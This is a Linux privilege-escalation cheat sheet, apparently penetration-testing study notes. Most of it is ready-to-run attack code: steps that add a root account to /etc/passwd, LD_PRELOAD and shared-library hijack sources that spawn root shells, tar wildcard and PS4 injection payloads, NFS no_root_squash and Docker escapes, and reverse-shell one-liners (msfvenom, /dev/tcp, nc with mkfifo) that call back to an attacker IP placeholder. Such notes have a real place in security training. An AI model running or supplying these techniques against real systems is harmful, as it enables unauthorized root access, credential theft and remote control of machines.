# Linux Privilege Escalation
* [General tips](#General-tips)
* [Tools](#Tools)
* [Manual Enumeration](#Manual-Enumeration)
* [Privilege escalation techniques](#Privilege-escalation-techniques)
   * [Kernel exploits](#Kernel-exploits)
   * [Service exploits](#Service-exploits)
   * [Weak file permissions](#Weak-file-permissions)
   * [Sudo](#Sudo)
   * [Cronjobs](#Cronjobs)
   * [Wildcards](#Wildcards)
   * [SUID / SGID](#SUID-/-SGID)
   * [Passwords & Keys](#Passwords-&-Keys)
   * [Root squashing](#Root-squashing)
* [Tips and tricks](#Tips-and-tricks)




## General tips
- https://gtfobins.github.io/

### Easy ways to get root
#### 1. Cat a new root user entry to /etc/passwd
```
openssl passwd <PASS> #generate password
echo "root2:<OPENSSL OUTPUT>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

#### 2. Copy /bin/bash and set suid bit
```
cp /bin/bash /tmp/rootbash sh; chmod +xs /temp/rootbash
/tmp/rootbash -p
```

#### 3. If a process executes another process which we control.
   - Compile the following C code
   ```
   int main() {
   setuid(0);
   system("/bin/bash -p");
   }
   ```
   - gcc -o <NAME> <FILENAME.C>

#### 4. MSFVenom shell
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -f elf > shell.elf
```

## Tools
#### Ise.sh (favorite from tib3rius)
https://github.com/diego-treitos/linux-smart-enumeration

```
./lse.sh
./lse.sh -l 1 -i #get more information
./lse.sh -l 2 -i #get more and more information
```

#### Linenum
https://github.com/rebootuser/LinEnum

```
./linEnum.sh
./linEnum.sh -k <PASSWORD> -e export -t
```

## Manual Enumeration
#### Check the current user
```
whoami; id
```

#### Check all the users
```
cat /etc/passwd
```

#### Check hostname
```
hostname
```

#### Check operatingsystem and architecture
```
cat /etc/*release*; cat /etc/*issue*; uname -a; arch
```

#### Check Running processes
```
ps aux
```

#### Check current privileges
```
sudo -l
```

#### Check networking information
```
ifconfig
ip a
routel
```

#### Check open ports
```
netstat -tulpn
```

#### Enumerate firewall
```
cat etc/iptables/*
```

#### Enumerate scheduled task
```
cat /etc/crontab; ls -lah /etc/cron*
ls /var/spol/cron; ls /var/spool/cron/crontabs/
```

#### Installed applications and patch levels
```
dpkg -l
```

#### Readable/writable files and directories
```
find / -writable -type d 2>/dev/null
```

#### Unmounted disks
```
cat /etc/fstab
mount
/bin/lsblk
mountvol
```

#### Device drivers and kernal modules
```
lsmod
/sbin/modinfo <MODULE>
```

#### Find SUID / SGID
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

#### Run SUID BIT
Use the following instead of just sudo <PROGRAM>
```
sudo -u root <PATH TO PROGRAM>
./.<PROGRAM> -p 
```

## Privilege escalation techniques
### Kernel exploits
Kernels are the core of any operating system. Think of it as a layer between application software and the actual computer hardware. The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the root user. Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.

1. Enumerate kernel versions ```(uname -a)```
2. Find matching exploits
   - https://github.com/jondonas/linux-exploit-suggester-2
3. Compile and run

## Service exploits
Services are simply programs that run in the background, accepting input or performing regular tasks. If vulnerable services are running as root, exploiting them can lead to command execution as root. Service exploits can be found using Searchsploit, Google, and GitHub, just like with Kernel exploits.

#### Find services running as root
```
ps aux | grep "^root"
````

#### Find version of software
```
<PROGRAM> --version
<PROGRAM> -v
dpkg -l | grep <PROGRAM>
rpm –qa | grep <PROGRAM>
```

## Weak file permissions
Certain system files can be taken advantage of to perform privilege escalation if the permissions on them are too weak. If a system file has confidential information we can read, it may be used to gain access to the root account. If a system file can be written to, we may be able to modify the way the operating system works and gain root access that way.

#### Find al writable files in /etc
```
find /etc -maxdepth 1 -writable -type f
```
- if /etc/shadow is readable. Change the hash!
- if /etc/passwd is writeable. (Write a new entry, See begin linux privesc)

#### Find al readable files in /etc
```
find /etc -maxdepth 1 -readable -type f
```
- if /etc/shadow is readable. Crack the hashes! ```mkpasswd -m sha-512 newpassword```

#### Find al directories which can be written to:
```
find / -executable -writable -type d 2> /dev/null
```

#### Look for backup files
```
ls /tmp
ls /var/backups
ls /
```

## Sudo
sudo is a program which lets users run other programs with the security privileges of other users. By default, that other user will be root. A user generally needs to enter their password to use sudo, and they must be permitted access via rule(s) in the /etc/sudoers file. Rules can be used to limit users to certain programs, and forgo the password entry requirement.

#### Check programs a user can run as sudo
```
sudo -l
```

#### Run a program using sudo
```
sudo <PROGRAM>
```

#### Run a program as a specific user
```
sudo -u <USERNAME> <PROGRAM>
```

#### If a program is found check gtfobins
- https://gtfobins.github.io/

### Apache2 trick
apache2 doesn’t have any known shell escape sequences, however when parsing a given config file, it will error and print any line it doesn’t understand. 
```
sudo apache2 -f /etc/shadow
```

### Environment variables
Programs run through sudo can inherit the environment variables from the user’s environment. In the /etc/sudoers config file, if the env_reset option is set, sudo will run programs in a new, minimal environment. The env_keep option can be used to keep certain environment variables from the user’s environment. The configured options are displayed when running sudo -l

### LD_preload
LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file. When set, the shared object will be loaded before any others. By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded. LD_PRELOAD will not work if the real user ID is different from the effective user ID. sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option.

#### Create a file (preload.c)
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

#### Compile it
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

#### Run any allowed program while setting the LD_Preload environment variable
```
sudo LD_PRELOAD=/tmp/preload.so <PROGRAM
```

### LD_LIBRARY_PATH
The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first. The ldd command can be used to print the shared libraries used by a program: ```ldd /usr/sbin/apache2``` By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.

#### Run ldd against program file
```
ldd /usr/sbin/apache2\
```

#### Create a file (library_path.c) with the following contents:
```
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

#### Compile library_path.c into libcrypt.so.1:
```
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```

#### Run apache2 using sudo, while setting the LD_LIBRARY_PATH environment variable to the current path (where we compiled library_path.c):
```
sudo LD_LIBRARY_PATH=. apache2
```

## Cronjobs
Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron jobs run with the security level of the user who owns them. By default, cron jobs are run using the /bin/sh shell, with limited environment variables. Cron table files (crontabs) store the configuration for cron jobs. User crontabs are usually located in ```/var/spool/cron/``` or ```/var/spool/cron/crontabs/``` The system-wide crontab is located at ```/etc/crontab```.

#### Overwritable files
- Different ways to exploit
  - bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
  - see beginnen of linux privesc for more ways
  
### Path environment variable
The crontab PATH environment variable is by default set to ```/usr/bin:/bin``` The PATH variable can be overwritten in the crontab file. If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.

#### Get content of the system wide contrab:
```
cat /etc/crontab
```

#### Create the file <SCRIPTNAME> in the writable directory with the following contents
```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
  
#### Ensure it executable
```
chmod +x /home/user/overwrite.sh
```

#### Run /tmp/rootbash
```
/tmp/rootbash -p
```

### Wildcards
When a wildcard character (\*) is provided to a command as part of an argument, the shell will first perform filename expansion (also known as globbing) on the wildcard. This process replaces the wildcard with a space-separated list of the file and directory names in the current directory. An easy way to see this in action is to run the following command from your home directory: ```echo *```

Exploiting wildcard for privilege escalation (For example tar * in this directory) https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

#### Example2
```
echo "mkfifo /tmp/lhennp; nc <ATTACKER IP> <ATTACKER PORT> 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

#### Example1
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf
chmod +x shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
nc -nvlp <PORT>
```

### SUID / SGID
- SUID files get executed with the privileges of the file owner.
- SGID files get executed with the privileges of the file group.
If the file is owned by root, it gets executed with root privileges, and we may be able to use it to escalate privileges.

#### Find SUID and SGID
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

### Shell escape sequences
Just as we were able to use shell escape sequences with programs running via sudo, we can do the same with SUID / SGID files. A list of programs with their shell escape sequences can be found here: https://gtfobins.github.io/ Refer to the previous section on shell escape sequences for how to use them.

### Shared object injection 
When a program is executed, it will try to load the shared objects it requires. By using a program called strace, we can track these system calls and determine whether any shared objects were not found. If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded.

#### run strace on the SUID File:
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
The <NAME> shared object could not be found, and the program is looking in <DIRECTORY>, which we can write to.
  
#### Creat the directory + file with the contents
```
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
setuid(0);
system("/bin/bash -p");
}
```

#### Compile FILE in the directory
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
```

#### Run SUID Executable

### PATH environment variable
The PATH environment variable contains a list of directories where the shell should try to find programs. If a program tries to execute another program, but only specifies the program name, rather than its full (absolute) path, the shell will search the PATH directories until it is found. Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to.

If a program tries to execute another program, the name of that program is likely embedded in the executable file as a string. We can run strings on the executable file to find strings of characters. We can also use strace to see how the program is executing. Another program called ltrace may also be of use.

```
strings <PATH TO FILE>
strace -v -f -e execve <COMMAND> 2>&1 | grep exec
ltrace <COMMAND>
```

### Abusing shell features #1
In some shells (notably Bash <4.2-048) it is possible to define user functions with an absolute path name. These functions can be exported so that subprocesses have access to them, and the functions can take precedence over the actual executable being called.

#### Run strings on the SUID File
```
strings /usr/local/bin/suid-env2
```

#### Verify the version of Bash is lower than 4.2-048:
```
bash --version
```

#### Create a Bash function with the name “PROGRAM IT RUNS” and export the function:
```
function <PROGRAM> { /bin/bash -p; }
export –f <PROGRAM>
```

#### Execute the SUID file

### Abusing shell features #2
Bash has a debugging mode which can be enabled with the –x command line option, or by modifying the SHELLOPTS environment variable to include xtrace. By default, SHELLOPTS is read only, however the env command allows SHELLOPTS to be set. When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debug statements. This variable can include an embedded command, which will execute every time it is shown.

If a SUID file runs another program via Bash (e.g. by using system() ) these environment variables can be inherited. If an SUID file is being executed, this command will execute with the privileges of the file owner. In Bash versions 4.4 and above, the PS4 environment variable is not inherited by shells running as root.

#### Run strings on the SUID File
```
strings /usr/local/bin/suid-env2
```

#### Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
```

#### Run the /tmp/rootbash file
```
/tmp/rootbash -p
```

## Passwords & Keys
While it might seem like a long shot, weak password storage and password re-use can be easy ways to escalate privileges. While the root user’s account password is hashed and stored securely in /etc/shadow, other passwords, such as those for services may be stored in plaintext in config files. If the root user re-used their password for a service, that password may be found and used to switch to the root user.

### History files
History files record commands issued by users while they are using certain programs. If a user types a password as part of a command, this password may get stored in a history file. It is always a good idea to try switching to the root user with a discovered password.

```
cat -/.*history
```

### Config files
Many services and programs use configuration (config) files to store settings. If a service needs to authenticate to something, it might store the credentials in a config file. If these config files are accessible, and the passwords they store are reused by privileged users, we may be able to use it to log in as that user.

- auth.txt in /etc/openvpn
- webconfigs
- sqlconfigs

### SSH keys
SSH keys can be used instead of passwords to authenticate users using SSH. SSH keys come in pairs: one private key, and one public key. The private key should always be kept secret. If a user has stored their private key insecurely, anyone who can read the key may be able to log into their account using it.

```
ls -l /.ssh
```

### NFS
NFS (Network File System) is a popular distributed file system. NFS shares are configured in the ```/etc/exports``` file. Remote users can mount shares, access, create, modify files. By default, created files inherit the remote user’s id and group id (as owner and group respectively), even if they don’t exist on the NFS server.

```
cat /etc/exports
```

#### Show the NFS server's export list:
```
showmount -e <TARGET>
```

#### Mount an NFS Share
```
mount -o rw,vers=2 <TARGET>:<SHARE> <LOCAL_DIRECTORY>
```

### Root squashing
Root Squashing is how NFS prevents an obvious privilege escalation. If the remote user is (or claims to be) root (uid=0), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group. While this behavior is default, it can be disabled!

### No_root_squash
no_root_squash is an NFS configuration option which turns root squashing off. When included in a writable share configuration, a remote user who identifies as “root” can create files on the NFS share as the local root user.

Create payload to the mounted share and set SUID bit
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
```

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/pwn.c
gcc /tmp/nfs/pwn.c -o /tmp/nfs/pwn
chmod +s pwn
```

## Tips and tricks
#### Exploiting path on binary
If a binary has a SUID and doesn’t use full path for executing something, you can manipulate the path to run another binary (/bin/sh).
- https://github.com/jondonas/linux-exploit-suggester-2
```
echo /bin/bash > /tmp/curl
chmod 777 /tmp/curl
export PATH=/tmp:$PATH
<PATH TO BINARY>
```

#### Man pages
As the pager is being executed with root privileges, we can break out of the pager with a root shell. Go into man page and enter `
```
!/bin/bash
```
 
#### SUID nmap
```
nmap --interactive
!sh
whoami
#root
```

### Docker
#### Check access to docker group
```
id
```

#### Read files example
```
docker run -v /root:/mnt alpine cat /mnt/proof.txt
```

### Get system shell
```
docker run -it -v /:/mnt alpine chroot /mnt
```

#### Break out of shell
https://github.com/s0wr0b1ndef/OSCP-note/blob/master/gain%20access/shells/spawn_shell_or%20break_out_of_jail.txt

